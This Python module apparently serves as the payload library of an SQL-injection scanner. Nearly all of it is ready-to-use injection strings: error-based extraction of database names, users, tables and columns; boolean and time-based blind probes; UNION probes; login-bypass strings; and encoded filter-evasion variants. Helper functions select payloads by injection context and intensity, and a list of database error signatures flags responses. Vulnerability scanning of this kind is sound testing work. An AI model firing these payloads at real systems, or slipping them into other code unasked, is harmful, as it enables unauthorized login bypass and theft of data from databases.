from typing import Dict, List, Optional

Payload = Dict[str, str]

_SLEEP = 5

STRENGTH_LIMIT = {
    "LOW":    5,
    "MEDIUM": 15,
    "HIGH":   40,
    "INSANE": 9999,
}

ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "xpath syntax error",
    "extractvalue(",
    "updatexml(",
    "duplicate entry",
    "column count doesn't match",
    "the used select statements have a different number",
    "supplied argument is not a valid mysql",
    "division by zero",
    "unknown column",
    "com.mysql.jdbc.exceptions",
    "org.gjt.mm.mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "pg_query",
    "sqlite_",
    "odbc_",
    "microsoft ole db provider for sql server",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "ora-",
    "invalid column name",
    "invalid object name",
]

ERROR_BASED_STRING: List[Payload] = [
    {"type": "ERROR_BASED", "role": "attack", "family": "extractvalue_db",      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
    {"type": "ERROR_BASED", "role": "attack", "family": "extractvalue_version",  "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -"},
    {"type": "ERROR_BASED", "role": "attack", "family": "extractvalue_user",     "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -"},
    {"type": "ERROR_BASED", "role": "attack", "family": "updatexml_db",          "payload": "' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- -"},
    {"type": "ERROR_BASED", "role": "attack", "family": "updatexml_version",     "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -"},
    {"type": "ERROR_BASED", "role": "attack", "family": "updatexml_user",        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)-- -"},
    {"type": "ERROR_BASED", "role": "attack", "family": "floor_rand_db",         "payload": "' AND (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)-- -"},
    {"type": "ERROR_BASED", "role": "attack", "family": "extractvalue_tables",   "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -"},
    {"type": "ERROR_BASED", "role": "attack", "family": "extractvalue_columns",  "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 1)))-- -"},
    {"type": "ERROR_BASED", "role": "attack", "family": "or_extractvalue_db",    "payload": "' OR EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
    {"type": "ERROR_BASED", "role": "attack", "family": "or_updatexml_db",       "payload": "' OR UPDATEXML(1,CONCAT(0x7e,database()),1)-- -"},
]

ERROR_BASED_NUMERIC: List[Payload] = [
    {"type": "ERROR_BASED", "role": "attack", "family": "num_extractvalue_db",      "payload": "0 OR EXTRACTVALUE(1,CONCAT(0x7e,database()))"},
    {"type": "ERROR_BASED", "role": "attack", "family": "num_extractvalue_version", "payload": "0 OR EXTRACTVALUE(1,CONCAT(0x7e,version()))"},
    {"type": "ERROR_BASED", "role": "attack", "family": "num_extractvalue_user",    "payload": "0 OR EXTRACTVALUE(1,CONCAT(0x7e,user()))"},
    {"type": "ERROR_BASED", "role": "attack", "family": "num_updatexml_db",         "payload": "0 OR UPDATEXML(1,CONCAT(0x7e,database()),1)"},
    {"type": "ERROR_BASED", "role": "attack", "family": "num_floor_rand",           "payload": "0 AND (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)"},
    {"type": "ERROR_BASED", "role": "attack", "family": "num_extractvalue_tables",  "payload": "0 OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))"},
]

BOOLEAN_STRING: List[Payload] = [
    {"type": "BOOLEAN", "role": "true_attack",  "family": "or_true",         "payload": "' OR '1'='1"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "or_true_comment", "payload": "' OR 1=1-- -"},
    {"type": "BOOLEAN", "role": "false_attack", "family": "and_false",       "payload": "' AND '1'='2'-- -"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "and_true",        "payload": "' AND '1'='1'-- -"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "ascii_gt",        "payload": "' AND ASCII(SUBSTRING(database(),1,1))>64-- -"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "ascii_eq",        "payload": "' AND ASCII(SUBSTRING(database(),1,1))=97-- -"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "length_db",       "payload": "' AND LENGTH(database())>1-- -"},
    {"type": "BOOLEAN", "role": "false_attack", "family": "length_db_eq",    "payload": "' AND LENGTH(database())=6-- -"},
    {"type": "BOOLEAN", "role": "false_attack", "family": "substr_a",        "payload": "' AND SUBSTRING(database(),1,1)='a'-- -"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "exists_tables",   "payload": "' AND EXISTS(SELECT * FROM information_schema.tables)-- -"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "case_true",       "payload": "' AND CASE WHEN (1=1) THEN 1 ELSE 0 END-- -"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "case_db_len",     "payload": "' AND CASE WHEN (LENGTH(database())>0) THEN 1 ELSE 0 END-- -"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "mid_regexp",      "payload": "' AND MID(database(),1,1) REGEXP '^[a-z]'-- -"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "like_wildcard",   "payload": "' AND database() LIKE '%'-- -"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "in_subquery",     "payload": "' AND 1 IN (SELECT 1 FROM information_schema.tables LIMIT 1)-- -"},
]

BOOLEAN_NUMERIC: List[Payload] = [
    {"type": "BOOLEAN", "role": "true_attack",  "family": "num_or_true",   "payload": "0 OR 1=1"},
    {"type": "BOOLEAN", "role": "false_attack", "family": "num_and_false", "payload": "1 AND 1=2"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "num_ascii",     "payload": "0 OR ASCII(SUBSTRING(database(),1,1))>64"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "num_length",    "payload": "0 OR LENGTH(database())>1"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "num_case",      "payload": "0 OR CASE WHEN (1=1) THEN 1 ELSE 0 END"},
    {"type": "BOOLEAN", "role": "true_attack",  "family": "num_exists",    "payload": "0 OR EXISTS(SELECT * FROM information_schema.tables)"},
]

TIME_BASED_STRING: List[Payload] = [
    {"type": "TIME_BASED", "role": "delay_attack",   "family": "and_sleep",      "payload": f"' AND SLEEP({_SLEEP})-- -"},
    {"type": "TIME_BASED", "role": "delay_attack",   "family": "or_sleep",       "payload": f"' OR SLEEP({_SLEEP})-- -"},
    {"type": "TIME_BASED", "role": "delay_attack",   "family": "if_sleep_true",  "payload": f"' AND IF(1=1,SLEEP({_SLEEP}),0)-- -"},
    {"type": "TIME_BASED", "role": "time_baseline",  "family": "if_sleep_false", "payload": f"' AND IF(1=2,SLEEP({_SLEEP}),0)-- -"},
    {"type": "TIME_BASED", "role": "delay_attack",   "family": "case_sleep",     "payload": f"' AND CASE WHEN (1=1) THEN SLEEP({_SLEEP}) ELSE 0 END-- -"},
    {"type": "TIME_BASED", "role": "delay_attack",   "family": "subquery_sleep", "payload": f"' AND 0 IN (SELECT SLEEP({_SLEEP}))-- -"},
    {"type": "TIME_BASED", "role": "delay_attack",   "family": "benchmark",      "payload": f"' OR BENCHMARK({_SLEEP*1000000},MD5(1))-- -"},
    {"type": "TIME_BASED", "role": "delay_attack",   "family": "if_ascii_sleep", "payload": f"' AND IF(ASCII(SUBSTRING(database(),1,1))>0,SLEEP({_SLEEP}),0)-- -"},
    {"type": "TIME_BASED", "role": "delay_attack",   "family": "pg_sleep",       "payload": f"'; SELECT pg_sleep({_SLEEP})-- -"},
    {"type": "TIME_BASED", "role": "delay_attack",   "family": "waitfor",        "payload": f"'; WAITFOR DELAY '0:0:{_SLEEP}'-- -"},
]

TIME_BASED_NUMERIC: List[Payload] = [
    {"type": "TIME_BASED", "role": "delay_attack", "family": "num_sleep",      "payload": f"0 OR SLEEP({_SLEEP})"},
    {"type": "TIME_BASED", "role": "delay_attack", "family": "num_if_sleep",   "payload": f"0 OR IF(1=1,SLEEP({_SLEEP}),0)"},
    {"type": "TIME_BASED", "role": "delay_attack", "family": "num_case_sleep", "payload": f"0 OR CASE WHEN (1=1) THEN SLEEP({_SLEEP}) ELSE 0 END"},
    {"type": "TIME_BASED", "role": "delay_attack", "family": "num_benchmark",  "payload": f"0 OR BENCHMARK({_SLEEP*1000000},MD5(1))"},
]

def _union_nulls(n: int, quote: str = "'") -> Payload:
    nulls = ",".join(["NULL"] * n)
    return {"type": "UNION", "role": "union_attack", "family": f"null_probe_{n}col", "payload": f"{quote} UNION SELECT {nulls}-- -"}

UNION_BASED: List[Payload] = (
    [_union_nulls(i) for i in range(1, 11)]
    + [
        {"type": "UNION", "role": "union_attack", "family": "version_3col",  "payload": "' UNION SELECT version(),NULL,NULL-- -"},
        {"type": "UNION", "role": "union_attack", "family": "database_3col", "payload": "' UNION SELECT database(),NULL,NULL-- -"},
        {"type": "UNION", "role": "union_attack", "family": "user_3col",     "payload": "' UNION SELECT user(),NULL,NULL-- -"},
        {"type": "UNION", "role": "union_attack", "family": "tables_3col",   "payload": "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -"},
        {"type": "UNION", "role": "union_attack", "family": "columns_3col",  "payload": "' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema=database() LIMIT 1-- -"},
        {"type": "UNION", "role": "union_attack", "family": "num_null_3col", "payload": "0 UNION SELECT NULL,NULL,NULL-- -"},
        {"type": "UNION", "role": "union_attack", "family": "num_version",   "payload": "0 UNION SELECT version(),NULL,NULL-- -"},
        {"type": "UNION", "role": "union_attack", "family": "num_database",  "payload": "0 UNION SELECT database(),NULL,NULL-- -"},
    ]
)

ORDERBY: List[Payload] = [
    {"type": "SQLI_ORDERBY", "role": "invalid_order", "family": "sleep_subq",       "payload": f"(SELECT SLEEP({_SLEEP}))"},
    {"type": "SQLI_ORDERBY", "role": "invalid_order", "family": "if_sleep",         "payload": f"IF(1=1,SLEEP({_SLEEP}),0)"},
    {"type": "SQLI_ORDERBY", "role": "valid_order",   "family": "case_true",        "payload": "CASE WHEN (1=1) THEN 1 ELSE 0 END"},
    {"type": "SQLI_ORDERBY", "role": "valid_order",   "family": "case_false",       "payload": "CASE WHEN (1=2) THEN 1 ELSE 0 END"},
    {"type": "SQLI_ORDERBY", "role": "valid_order",   "family": "ascii_case",       "payload": "CASE WHEN (ASCII(SUBSTRING(database(),1,1))>64) THEN 1 ELSE 0 END"},
    {"type": "SQLI_ORDERBY", "role": "invalid_order", "family": "extractvalue_db",  "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database()))"},
    {"type": "SQLI_ORDERBY", "role": "invalid_order", "family": "extractvalue_ver", "payload": "EXTRACTVALUE(1,CONCAT(0x7e,version()))"},
    {"type": "SQLI_ORDERBY", "role": "invalid_order", "family": "updatexml_db",     "payload": "UPDATEXML(1,CONCAT(0x7e,database()),1)"},
    {"type": "SQLI_ORDERBY", "role": "invalid_order", "family": "updatexml_user",   "payload": "UPDATEXML(1,CONCAT(0x7e,user()),1)"},
    {"type": "SQLI_ORDERBY", "role": "invalid_order", "family": "asc_sleep",        "payload": f"1,(SELECT SLEEP({_SLEEP}))"},
    {"type": "SQLI_ORDERBY", "role": "invalid_order", "family": "if_ascii_sleep",   "payload": f"IF(ASCII(SUBSTRING(database(),1,1))>64,SLEEP({_SLEEP}),0)"},
    {"type": "SQLI_ORDERBY", "role": "valid_order",   "family": "rand_bool",        "payload": "RAND(0)"},
    {"type": "SQLI_ORDERBY", "role": "invalid_order", "family": "floor_rand",       "payload": "(SELECT COUNT(*) FROM information_schema.tables GROUP BY FLOOR(RAND(0)*2))"},
]

FIELD_SELECTOR: List[Payload] = [
    {"type": "SQLI_FIELD", "role": "true_attack",  "family": "bool_true",        "payload": "1=1)-- -"},
    {"type": "SQLI_FIELD", "role": "false_attack",  "family": "bool_false",       "payload": "1=2)-- -"},
    {"type": "SQLI_FIELD", "role": "delay_attack",  "family": "sleep",            "payload": f"SLEEP({_SLEEP})-- -"},
    {"type": "SQLI_FIELD", "role": "delay_attack",  "family": "if_sleep",        "payload": f"IF(1=1,SLEEP({_SLEEP}),0))-- -"},
    {"type": "SQLI_FIELD", "role": "attack",        "family": "extractvalue_db",  "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -"},
    {"type": "SQLI_FIELD", "role": "attack",        "family": "extractvalue_ver", "payload": "EXTRACTVALUE(1,CONCAT(0x7e,version())))-- -"},
    {"type": "SQLI_FIELD", "role": "attack",        "family": "updatexml_db",     "payload": "UPDATEXML(1,CONCAT(0x7e,database()),1))-- -"},
    {"type": "SQLI_FIELD", "role": "delay_attack",  "family": "and_sleep",       "payload": f"id)AND(SLEEP({_SLEEP}))-- -"},
    {"type": "SQLI_FIELD", "role": "attack",        "family": "and_extractvalue", "payload": "id)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -"},
    {"type": "SQLI_FIELD", "role": "true_attack",   "family": "and_true",        "payload": "id)AND(1=1)-- -"},
    {"type": "SQLI_FIELD", "role": "false_attack",  "family": "and_false",       "payload": "id)AND(1=2)-- -"},
    {"type": "SQLI_FIELD", "role": "attack",        "family": "or_extractvalue",  "payload": "id)OR(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -"},
]

SQLI_LOGIN: List[Payload] = [
    {"type": "SQLI_LOGIN", "role": "attack", "family": "auth_bypass_admin",   "payload": "admin'-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "auth_bypass_comment", "payload": "'-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "or_true_dq",          "payload": "' OR '1'='1'-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "or_true_numeric",     "payload": "' OR 1=1-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "or_like",             "payload": "' OR 'a'='a'-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "or_tautology",        "payload": "' OR '1'='1"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "double_quote_bypass", "payload": "\" OR \"1\"=\"1\"-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "or_numeric",          "payload": "0 OR 1=1-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "sleep_detect",        "payload": f"' AND SLEEP({_SLEEP})-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "or_sleep",            "payload": f"0 OR SLEEP({_SLEEP})-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "if_sleep",            "payload": f"' AND IF(1=1,SLEEP({_SLEEP}),0)-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "extractvalue_db",     "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "updatexml_user",      "payload": "' OR UPDATEXML(1,CONCAT(0x7e,user()),1)-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "union_3col",          "payload": "' UNION SELECT NULL,NULL,NULL-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "hash_bypass",         "payload": "' OR 1=1 LIMIT 1-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "comment_hash",        "payload": "admin'#"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "wildcard_like",       "payload": "' OR username LIKE '%admin%'-- -"},
    {"type": "SQLI_LOGIN", "role": "attack", "family": "null_pass",           "payload": "' OR password IS NULL-- -"},
]

JSON_CONTEXT: List[Payload] = [
    {"type": "SQLI_STRING", "role": "attack", "family": "json_or_true",      "payload": "\" OR \"1\"=\"1"},
    {"type": "SQLI_STRING", "role": "attack", "family": "json_and_sleep",    "payload": f"\" AND SLEEP({_SLEEP})-- -"},
    {"type": "SQLI_STRING", "role": "attack", "family": "json_extractvalue", "payload": "\" AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
]

ENCODED: List[Payload] = [
    {"type": "SQLI_STRING", "role": "attack", "family": "url_encoded_quote",   "payload": "%27 OR 1=1-- -"},
    {"type": "SQLI_STRING", "role": "attack", "family": "double_encoded",      "payload": "%2527 OR 1=1-- -"},
    {"type": "SQLI_STRING", "role": "attack", "family": "unicode_quote",       "payload": "' OR 1=1-- -"},
    {"type": "SQLI_STRING", "role": "attack", "family": "hex_encoded_db",      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,0x64617461626173652829))-- -"},
    {"type": "SQLI_STRING", "role": "attack", "family": "comment_bypass",      "payload": "' /*!OR*/ 1=1-- -"},
    {"type": "SQLI_STRING", "role": "attack", "family": "inline_comment",      "payload": "'/**/OR/**/1=1-- -"},
    {"type": "SQLI_STRING", "role": "attack", "family": "case_variation",      "payload": "' oR '1'='1'-- -"},
    {"type": "SQLI_STRING", "role": "attack", "family": "scientific_notation", "payload": "' OR 1e0=1-- -"},
]


def match_error(response_body: str) -> Optional[str]:
    body_lower = response_body.lower()
    for pattern in ERROR_PATTERNS:
        if pattern.lower() in body_lower:
            return pattern
    return None


def _limit(payloads: List[Payload], strength: str) -> List[Payload]:
    return payloads[: STRENGTH_LIMIT.get(strength.upper(), STRENGTH_LIMIT["MEDIUM"])]


def _dedupe(groups: List[List[Payload]]) -> List[Payload]:
    seen = set()
    result: List[Payload] = []
    for group in groups:
        for item in group:
            if item["payload"] not in seen:
                seen.add(item["payload"])
                result.append(item)
    return result


def get_by_context(context: str, strength: str = "MEDIUM") -> List[Payload]:
    context = context.lower()
    if context == "string":
        pool = _dedupe([ERROR_BASED_STRING, BOOLEAN_STRING, TIME_BASED_STRING])
    elif context == "numeric":
        pool = _dedupe([ERROR_BASED_NUMERIC, BOOLEAN_NUMERIC, TIME_BASED_NUMERIC])
    elif context == "orderby":
        pool = ORDERBY
    elif context == "field":
        pool = FIELD_SELECTOR
    elif context in {"login", "auth"}:
        pool = SQLI_LOGIN
    elif context == "union":
        pool = UNION_BASED
    elif context == "encoded":
        pool = ENCODED
    else:
        pool = get_all()
    return _limit(pool, strength)


def get_all() -> List[Payload]:
    return _dedupe([
        ERROR_BASED_STRING,
        ERROR_BASED_NUMERIC,
        BOOLEAN_STRING,
        BOOLEAN_NUMERIC,
        TIME_BASED_STRING,
        TIME_BASED_NUMERIC,
        UNION_BASED,
        ORDERBY,
        FIELD_SELECTOR,
        SQLI_LOGIN,
        JSON_CONTEXT,
        ENCODED,
    ])


BLIND_SQLI: Dict[str, List[Payload]] = {
    "string_sq": [
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "and_true",    "payload": "test' AND '1'='1' -- "},
        {"type": "BOOLEAN",    "role": "false_attack",  "family": "and_false",   "payload": "test' AND '1'='2' -- "},
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "subq_tables", "payload": "test' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- "},
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "db_len",      "payload": "test' AND LENGTH(database())>0 -- "},
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "db_char",     "payload": "test' AND SUBSTR(database(),1,1)>'a' -- "},
        {"type": "TIME_BASED", "role": "delay_attack", "family": "and_sleep",   "payload": "test' AND 0 IN (SELECT SLEEP(5)) -- "},
        {"type": "TIME_BASED", "role": "delay_attack", "family": "if_sleep",    "payload": "test' AND IF(1=1,SLEEP(5),0) -- "},
    ],
    "integer": [
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "and_true",    "payload": "1 AND 1=1-- -"},
        {"type": "BOOLEAN",    "role": "false_attack",  "family": "and_false",   "payload": "1 AND 1=2-- -"},
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "subq_tables", "payload": "1 AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- -"},
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "db_len",      "payload": "1 AND LENGTH(database())>0-- -"},
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "db_char",     "payload": "1 AND SUBSTR(database(),1,1)>'a'-- -"},
        {"type": "TIME_BASED", "role": "delay_attack", "family": "and_sleep",   "payload": "1 AND 0 IN (SELECT SLEEP(5))-- -"},
        {"type": "TIME_BASED", "role": "delay_attack", "family": "if_sleep",    "payload": "1 AND IF(1=1,SLEEP(5),0)-- -"},
    ],
    "string_dq": [
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "and_true",    "payload": 'val" AND "1"="1" -- '},
        {"type": "BOOLEAN",    "role": "false_attack",  "family": "and_false",   "payload": 'val" AND "1"="2" -- '},
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "subq_tables", "payload": 'val" AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- '},
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "db_len",      "payload": 'val" AND LENGTH(database())>0 -- '},
        {"type": "TIME_BASED", "role": "delay_attack", "family": "and_sleep",   "payload": 'val" AND 0 IN (SELECT SLEEP(5)) -- '},
        {"type": "TIME_BASED", "role": "delay_attack", "family": "if_sleep",    "payload": 'val" AND IF(1=1,SLEEP(5),0) -- '},
    ],
    "like_string": [
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "paren_true",        "payload": "%' AND 1=1)-- -"},
        {"type": "BOOLEAN",    "role": "false_attack",  "family": "paren_false",       "payload": "%' AND 1=2)-- -"},
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "paren_subq_tables", "payload": "%' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1)-- -"},
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "paren_db_len",      "payload": "%' AND LENGTH(database())>0)-- -"},
        {"type": "BOOLEAN",    "role": "true_attack",  "family": "paren_db_char",     "payload": "%' AND SUBSTR(database(),1,1)>'a')-- -"},
        {"type": "TIME_BASED", "role": "delay_attack", "family": "paren_sleep",       "payload": "%') AND SLEEP(5)-- -"},
        {"type": "TIME_BASED", "role": "delay_attack", "family": "if_sleep",          "payload": "%' AND IF(1=1,SLEEP(5),0))-- -"},
        {"type": "TIME_BASED", "role": "delay_attack", "family": "and_sleep",         "payload": "%' AND 0 IN (SELECT SLEEP(5)) -- -"},
    ],
}


def get_blind_sqli(context: str) -> List[Payload]:
    return BLIND_SQLI.get(context.lower(), [])


def get_by_strength(strength: str = "MEDIUM") -> List[Payload]:
    return _limit(get_all(), strength)


_SQL_CONTEXT_MAP = {
    "field_selector": "field",
    "auth":           "login",
    "like_string":    None,
}

def get_by_sql_context(context: str, strength: str = "MEDIUM") -> List[Payload]:
    mapped = _SQL_CONTEXT_MAP.get(context.lower())
    if mapped is None and context.lower() == "like_string":
        return _limit(get_blind_sqli("like_string"), strength)
    return get_by_context(mapped or context, strength)
